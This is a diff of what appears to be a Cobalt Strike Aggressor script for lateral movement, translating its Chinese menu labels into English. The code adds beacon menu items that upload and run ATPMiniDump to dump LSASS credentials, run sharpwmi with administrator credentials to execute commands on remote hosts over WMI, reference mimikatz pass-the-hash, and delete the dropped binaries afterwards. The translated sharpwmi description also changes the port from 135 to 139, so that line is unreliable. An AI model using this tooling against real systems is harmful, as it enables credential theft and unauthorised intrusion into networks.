@@ -2,12 +2,12 @@
 #                            #
 #                            #
 #                            #
-#       Xway.cn@panda        #
+#       XWAY.CN@panda        #
 #                            #
 #                            #
 #                            #
 ##############################
-	menu "横向移动" {
+	menu "Lateral Movement" {
     	item "NTLM hash"{
     		local('$bid');
                foreach $bid ($1){
@@ -32,11 +32,11 @@ sub internal_monologue{
 		}
 
 	    menu "ATPMiniDump" {
-			item "上传ATPMiniDump" {
+			item "Upload ATPMiniDump" {
 				$bid = $1;
-				$dialog = dialog("上传ATPMiniDump", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &ATPMiniDump);
-				drow_text($dialog, "UploadPath",  "上传路径: "); 	
-				dbutton_action($dialog, "上传");
+				$dialog = dialog("Upload ATPMiniDump", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &ATPMiniDump);
+				drow_text($dialog, "UploadPath",  "UploadPath: "); 	
+				dbutton_action($dialog, "Upload");
 				dialog_show($dialog);
         }
 sub ATPMiniDump {
@@ -46,11 +46,11 @@ sub ATPMiniDump {
     
 
 }
-		  item "运行ATPMiniDump" {
+		  item "Run ATPMiniDump" {
 			$bid = $1;
 			$dialog = dialog("ATPMiniDump", %(bid => $bid), &ATPMiniDump_run);
-			dialog_description($dialog, "使用PssCaptureSnapShot上的MiniDumpWriteDump转储LSASS内存。");
-            dbutton_action($dialog, "运行");
+			dialog_description($dialog, "Use PssCaptureSnapShot - MiniDumpWriteDump to dump LSASS.");
+            dbutton_action($dialog, "RUN");
 			dialog_show($dialog);
         }
 
@@ -58,7 +58,7 @@ sub ATPMiniDump_run{
 	bshell($bid, "ATPMiniDump.exe");
 }
 
-        	item "删除ATPMiniDump"{
+        	item "Delete ATPMiniDump"{
         	local('$bid');
         	foreach $bid ($1){
             	bshell($1, "del /f /s /q ATPMiniDump.exe");
@@ -92,11 +92,11 @@ sub mimikatz_passthehash{
 }
 
 	    menu "sharpwmi" {
-			item "上传sharpwmi" {
+			item "Upload sharpwmi" {
 				$bid = $1;
-				$dialog = dialog("上传sharpwmi", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &sharpwmi_up);
-				drow_text($dialog, "UploadPath",  "上传路径: "); 	
-				dbutton_action($dialog, "上传");
+				$dialog = dialog("Upload sharpwmi", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &sharpwmi_up);
+				drow_text($dialog, "UploadPath",  "UploadPath: "); 	
+				dbutton_action($dialog, "Upload");
 				dialog_show($dialog);
         }
 sub sharpwmi_up {
@@ -106,10 +106,10 @@ sub sharpwmi_up {
     
 
 }
-                item "运行sharpwmi"{
+                item "Run sharpwmi"{
                     $bid = $1['@'];
-                    $Dialog = dialog("运行sharpwmi",%(ip => "127.0.0.1", username => "administrator", password => "password", type => "cmd or upload", cmd/path => "cmd or upload path",bid => $bid),&sharpwmi_run);
-                    dialog_description($Dialog, "这是一个基于135端口来进行横向移动的工具，具有执行命令和上传文件功能，通过wmi来执行命令，通过调用来进行数据传输,目前只支持上传512kb以下的文件，因为重置每个值的长度不能超过512kb。");
+                    $Dialog = dialog("Run sharpwmi",%(ip => "127.0.0.1", username => "administrator", password => "password", type => "cmd or upload", cmd/path => "cmd or upload path",bid => $bid),&sharpwmi_run);
+                    dialog_description($Dialog, "Use port 139. Can upload files and exec by wmi. Files should be less than 512kb.");
                     drow_text($Dialog, "ip", "ip: ");
 					drow_text($Dialog, "username", "username: ");
 					drow_text($Dialog, "password", "password: ");
@@ -128,7 +128,7 @@ sub sharpwmi_run{
 	$cmd/path = $3['cmd/path'];
 	bshell($bid, "sharpwmi.exe  $+ $Name  $+ $port  $+ $username  $+ $password  $+ $type  $+ $cmd/path");
 } 
-        	item "删除sharpwmi"{
+        	item "Delete sharpwmi"{
         	local('$bid');
         	foreach $bid ($1){
             	bshell($1, "del /f /s /q sharpwmi.exe");
